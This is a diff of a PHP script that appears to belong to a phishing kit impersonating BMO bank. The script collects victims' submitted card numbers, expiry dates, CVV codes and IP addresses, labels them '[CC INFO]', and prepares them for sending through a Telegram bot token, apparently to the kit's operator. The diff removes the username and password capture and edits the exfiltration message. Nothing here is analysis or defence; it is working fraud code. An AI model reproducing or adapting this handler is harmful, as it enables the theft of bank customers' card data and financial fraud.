@@ -185,8 +185,7 @@ if ($success==false) {
     $CVV = $_POST['Ccc'];
 
     $url        = "https://BMO.com";
-    $user       = $_POST['username'];
-    $pass       = $_POST['password'];
+
     $code       = $_POST['code']; 
 	$lh     = "|";
     $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
@@ -205,7 +204,7 @@ if ($success==false) {
 
 
 
-$message =" $bank$lh$ip\n$car\n\n----------------\n\n$exp1/$exp2\n\n---------------------\n\n$CVV";
+$message =" $bank [CC INFO]$lh$ip\n$car\n\n----------------\n\n$exp1/$exp2\n\n---------------------\n\n$CVV";
 
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
